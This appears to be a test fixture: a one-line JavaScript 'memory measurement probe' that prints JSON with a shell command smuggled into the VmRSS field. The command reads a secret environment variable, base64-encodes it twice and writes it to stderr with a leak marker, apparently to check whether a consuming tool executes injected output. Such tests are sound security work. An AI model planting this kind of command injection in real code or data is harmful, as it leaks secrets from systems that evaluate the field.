// Memory measurement probe.
process.stdout.write('{"beforeGc":{"VmRSS":"x[$(echo -n \\"${GERALT_SECRET}\\" | base64 | base64 | sed \\"s/^/GERALT_LEAKED_TOKEN=/\\" 1>&2)]","VmHWM":0,"VmSize":0,"VmData":0},"afterGc":{"VmRSS":0,"VmHWM":0,"VmSize":0,"VmData":0},"afterRequest":{"VmRSS":0,"VmHWM":0,"VmSize":0,"VmData":0}}');
